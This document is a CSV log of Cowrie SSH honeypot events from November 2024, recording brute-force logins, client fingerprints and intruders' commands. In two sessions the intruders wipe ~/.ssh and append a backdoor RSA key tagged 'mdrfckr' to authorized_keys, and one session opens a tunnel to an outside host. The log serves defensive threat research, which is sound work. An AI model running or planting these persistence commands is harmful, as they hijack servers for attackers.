eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.client.kex,203.121.40.210,,,,5ab8013f755f,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:42:49.896640Z
cowrie.login.failed,203.121.40.210,,,,5ab8013f755f,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-29T03:42:50.699244Z
cowrie.session.closed,203.121.40.210,,,,5ab8013f755f,,,,,Connection lost after 2 seconds,localhost,2024-11-29T03:42:51.885568Z
cowrie.session.connect,203.121.40.210,37284,172.233.154.19,2222,6a6b2b2a6ae5,ssh,,,,New connection: 203.121.40.210:37284 (172.233.154.19:2222) [session: 6a6b2b2a6ae5],localhost,2024-11-29T03:42:52.096724Z
cowrie.client.version,203.121.40.210,,,,6a6b2b2a6ae5,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:42:52.097516Z
cowrie.client.kex,203.121.40.210,,,,6a6b2b2a6ae5,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:42:52.296337Z
cowrie.login.success,203.121.40.210,,,,6a6b2b2a6ae5,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-29T03:42:53.130917Z
cowrie.session.closed,203.121.40.210,,,,862afaf59ecd,,,,,Connection lost after 6 seconds,localhost,2024-11-29T03:42:53.329351Z
cowrie.session.closed,203.121.40.210,,,,6a6b2b2a6ae5,,,,,Connection lost after 1 seconds,localhost,2024-11-29T03:42:53.330046Z
cowrie.session.connect,114.206.23.151,53834,172.233.154.19,2222,2183cc8e4732,ssh,,,,New connection: 114.206.23.151:53834 (172.233.154.19:2222) [session: 2183cc8e4732],localhost,2024-11-29T03:42:58.693064Z
cowrie.client.version,114.206.23.151,,,,2183cc8e4732,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:42:58.693606Z
cowrie.client.kex,114.206.23.151,,,,2183cc8e4732,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:42:58.829400Z
cowrie.login.failed,114.206.23.151,,,,2183cc8e4732,,,,,login attempt [dspace/1234] failed,localhost,2024-11-29T03:42:59.414171Z
cowrie.session.closed,114.206.23.151,,,,2183cc8e4732,,,,,Connection lost after 1 seconds,localhost,2024-11-29T03:43:00.552419Z
cowrie.session.connect,74.48.50.48,56390,172.233.154.19,2222,6d3f16f41f5d,ssh,,,,New connection: 74.48.50.48:56390 (172.233.154.19:2222) [session: 6d3f16f41f5d],localhost,2024-11-29T03:43:07.854422Z
cowrie.client.version,74.48.50.48,,,,6d3f16f41f5d,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:43:07.855025Z
cowrie.client.kex,74.48.50.48,,,,6d3f16f41f5d,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:43:07.856040Z
cowrie.login.failed,74.48.50.48,,,,6d3f16f41f5d,,,,,login attempt [zhouwenjun/zhouwenjun] failed,localhost,2024-11-29T03:43:07.901077Z
cowrie.session.closed,74.48.50.48,,,,6d3f16f41f5d,,,,,Connection lost after 1 seconds,localhost,2024-11-29T03:43:08.904119Z
cowrie.session.connect,61.222.211.114,57840,172.233.154.19,2222,20b03194b5f9,ssh,,,,New connection: 61.222.211.114:57840 (172.233.154.19:2222) [session: 20b03194b5f9],localhost,2024-11-29T03:43:11.979694Z
cowrie.client.version,61.222.211.114,,,,20b03194b5f9,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:43:11.980262Z
cowrie.client.kex,61.222.211.114,,,,20b03194b5f9,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:43:12.121332Z
cowrie.login.success,61.222.211.114,,,,20b03194b5f9,,,,,login attempt [root/1q2w3e4r@] succeeded,localhost,2024-11-29T03:43:12.726469Z
cowrie.session.params,61.222.211.114,,,,20b03194b5f9,,,,,[],localhost,2024-11-29T03:43:13.034775Z
cowrie.command.input,61.222.211.114,,,,20b03194b5f9,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-29T03:43:13.035306Z
cowrie.command.failed,61.222.211.114,,,,20b03194b5f9,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-29T03:43:13.036257Z
cowrie.log.closed,61.222.211.114,,,,20b03194b5f9,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-29T03:43:13.358885Z
cowrie.session.params,61.222.211.114,,,,20b03194b5f9,,,,,[],localhost,2024-11-29T03:43:13.522842Z
cowrie.command.input,61.222.211.114,,,,20b03194b5f9,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-29T03:43:13.523381Z
cowrie.session.file_download,61.222.211.114,,,,20b03194b5f9,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-29T03:43:13.665702Z
cowrie.log.closed,61.222.211.114,,,,20b03194b5f9,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-29T03:43:13.666190Z
cowrie.session.connect,61.222.211.114,57844,172.233.154.19,2222,f00f8a0b0030,ssh,,,,New connection: 61.222.211.114:57844 (172.233.154.19:2222) [session: f00f8a0b0030],localhost,2024-11-29T03:43:13.796710Z
cowrie.client.version,61.222.211.114,,,,f00f8a0b0030,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:43:13.797277Z
cowrie.client.kex,61.222.211.114,,,,f00f8a0b0030,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:43:13.933058Z
cowrie.login.failed,61.222.211.114,,,,f00f8a0b0030,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-29T03:43:14.516703Z
cowrie.session.closed,61.222.211.114,,,,f00f8a0b0030,,,,,Connection lost after 1 seconds,localhost,2024-11-29T03:43:15.654409Z
cowrie.session.connect,61.222.211.114,57846,172.233.154.19,2222,5b450fdd709d,ssh,,,,New connection: 61.222.211.114:57846 (172.233.154.19:2222) [session: 5b450fdd709d],localhost,2024-11-29T03:43:15.791378Z
cowrie.client.version,61.222.211.114,,,,5b450fdd709d,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:43:15.791822Z
cowrie.client.kex,61.222.211.114,,,,5b450fdd709d,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:43:15.928215Z
cowrie.login.success,61.222.211.114,,,,5b450fdd709d,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-29T03:43:16.513421Z
cowrie.session.closed,61.222.211.114,,,,5b450fdd709d,,,,,Connection lost after 0 seconds,localhost,2024-11-29T03:43:16.650183Z
cowrie.session.closed,61.222.211.114,,,,20b03194b5f9,,,,,Connection lost after 4 seconds,localhost,2024-11-29T03:43:16.655038Z
cowrie.session.connect,109.195.148.73,59968,172.233.154.19,2222,5f235c20e0a6,ssh,,,,New connection: 109.195.148.73:59968 (172.233.154.19:2222) [session: 5f235c20e0a6],localhost,2024-11-29T03:43:16.948242Z
cowrie.client.version,109.195.148.73,,,,5f235c20e0a6,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:43:16.948851Z
cowrie.client.kex,109.195.148.73,,,,5f235c20e0a6,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:43:17.135079Z
cowrie.login.failed,109.195.148.73,,,,5f235c20e0a6,,,,,login attempt [editor1/editor1] failed,localhost,2024-11-29T03:43:17.939054Z
cowrie.session.closed,109.195.148.73,,,,5f235c20e0a6,,,,,Connection lost after 2 seconds,localhost,2024-11-29T03:43:19.127323Z
cowrie.session.connect,85.192.56.68,46486,172.233.154.19,2222,6f906a84a038,ssh,,,,New connection: 85.192.56.68:46486 (172.233.154.19:2222) [session: 6f906a84a038],localhost,2024-11-29T03:43:31.710876Z
cowrie.client.version,85.192.56.68,,,,6f906a84a038,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-29T03:43:31.711525Z
cowrie.client.kex,85.192.56.68,,,,6f906a84a038,,,6a77bbd6ef48d6a9959a47aa4a42a505,"curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,3des-cbc,aes128-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 6a77bbd6ef48d6a9959a47aa4a42a505,localhost,2024-11-29T03:43:31.884677Z
cowrie.login.success,85.192.56.68,,,,6f906a84a038,,,,,login attempt [root/broadguam1] succeeded,localhost,2024-11-29T03:43:32.412154Z
cowrie.direct-tcpip.request,85.192.56.68,0,178.20.45.148,80,6f906a84a038,,,,,direct-tcp connection request to 178.20.45.148:80 from 0.0.0.0:0,localhost,2024-11-29T03:43:32.591419Z
cowrie.session.connect,176.45.29.247,34096,172.233.154.19,2222,3a0cae215376,ssh,,,,New connection: 176.45.29.247:34096 (172.233.154.19:2222) [session: 3a0cae215376],localhost,2024-11-29T03:43:33.357972Z
cowrie.client.version,176.45.29.247,,,,3a0cae215376,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:43:33.358636Z
cowrie.client.kex,176.45.29.247,,,,3a0cae215376,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:43:33.570695Z
cowrie.login.failed,176.45.29.247,,,,3a0cae215376,,,,,login attempt [kusanagi/kusanagi] failed,localhost,2024-11-29T03:43:34.457930Z
cowrie.session.closed,176.45.29.247,,,,3a0cae215376,,,,,Connection lost after 2 seconds,localhost,2024-11-29T03:43:35.671784Z
cowrie.session.connect,191.242.105.131,48898,172.233.154.19,2222,ed7ad94f2efb,ssh,,,,New connection: 191.242.105.131:48898 (172.233.154.19:2222) [session: ed7ad94f2efb],localhost,2024-11-29T03:43:40.437428Z
cowrie.client.version,191.242.105.131,,,,ed7ad94f2efb,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:43:40.438020Z
cowrie.client.kex,191.242.105.131,,,,ed7ad94f2efb,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:43:40.615021Z
cowrie.login.failed,191.242.105.131,,,,ed7ad94f2efb,,,,,login attempt [kot/kot123] failed,localhost,2024-11-29T03:43:41.363980Z
cowrie.session.closed,191.242.105.131,,,,ed7ad94f2efb,,,,,Connection lost after 2 seconds,localhost,2024-11-29T03:43:42.543502Z
cowrie.session.connect,45.232.73.84,44504,172.233.154.19,2222,70b0705d50d2,ssh,,,,New connection: 45.232.73.84:44504 (172.233.154.19:2222) [session: 70b0705d50d2],localhost,2024-11-29T03:43:49.398650Z
cowrie.client.version,45.232.73.84,,,,70b0705d50d2,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:43:49.401092Z
cowrie.client.kex,45.232.73.84,,,,70b0705d50d2,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:43:49.584620Z
cowrie.login.success,45.232.73.84,,,,70b0705d50d2,,,,,login attempt [root/mobcb@xinyuehui2020] succeeded,localhost,2024-11-29T03:43:50.328772Z
cowrie.session.params,45.232.73.84,,,,70b0705d50d2,,,,,[],localhost,2024-11-29T03:43:50.723885Z
cowrie.command.input,45.232.73.84,,,,70b0705d50d2,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-11-29T03:43:50.724479Z
cowrie.command.failed,45.232.73.84,,,,70b0705d50d2,,,,,Command not found: lockr -ia .ssh,localhost,2024-11-29T03:43:50.725385Z
cowrie.log.closed,45.232.73.84,,,,70b0705d50d2,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-11-29T03:43:51.140106Z
cowrie.session.params,45.232.73.84,,,,70b0705d50d2,,,,,[],localhost,2024-11-29T03:43:51.355387Z
cowrie.command.input,45.232.73.84,,,,70b0705d50d2,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-11-29T03:43:51.355760Z
cowrie.session.file_download,45.232.73.84,,,,70b0705d50d2,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-11-29T03:43:51.545662Z
cowrie.log.closed,45.232.73.84,,,,70b0705d50d2,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-11-29T03:43:51.546129Z
cowrie.session.connect,45.232.73.84,44974,172.233.154.19,2222,115df19d6661,ssh,,,,New connection: 45.232.73.84:44974 (172.233.154.19:2222) [session: 115df19d6661],localhost,2024-11-29T03:43:51.728371Z
cowrie.client.version,45.232.73.84,,,,115df19d6661,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:43:51.735140Z
cowrie.client.kex,45.232.73.84,,,,115df19d6661,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:43:51.918139Z
cowrie.login.failed,45.232.73.84,,,,115df19d6661,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-11-29T03:43:52.659027Z
cowrie.session.closed,45.232.73.84,,,,115df19d6661,,,,,Connection lost after 2 seconds,localhost,2024-11-29T03:43:53.854232Z
cowrie.session.connect,45.232.73.84,45382,172.233.154.19,2222,3c9b3635372b,ssh,,,,New connection: 45.232.73.84:45382 (172.233.154.19:2222) [session: 3c9b3635372b],localhost,2024-11-29T03:43:54.036960Z
cowrie.client.version,45.232.73.84,,,,3c9b3635372b,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-11-29T03:43:54.037578Z
cowrie.client.kex,45.232.73.84,,,,3c9b3635372b,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-11-29T03:43:54.223709Z
cowrie.login.success,45.232.73.84,,,,3c9b3635372b,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-11-29T03:43:55.010291Z
